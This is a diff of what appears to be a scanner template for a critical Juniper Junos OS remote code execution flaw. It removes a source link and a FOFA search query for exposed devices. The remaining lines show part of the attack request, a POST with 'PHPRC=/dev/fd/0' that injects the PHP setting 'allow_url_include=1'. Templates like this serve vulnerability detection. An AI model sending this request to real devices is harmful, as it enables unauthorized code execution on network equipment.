@@ -3,12 +3,8 @@ info:
   name: Juniper Networks Junos OS 远程代码执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/lixkhcgs5oxgage1'
+  description: ''
   tags: rce,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: lixkhcgs5oxgage1
-    fofa: title="Juniper Web Device Manager"
 http:
 - raw:
   - 'POST /?PHPRC=/dev/fd/0 HTTP/1.1
@@ -27,8 +23,6 @@ http:
 
 
     Connection: close
-
-
 
 
     allow_url_include=1
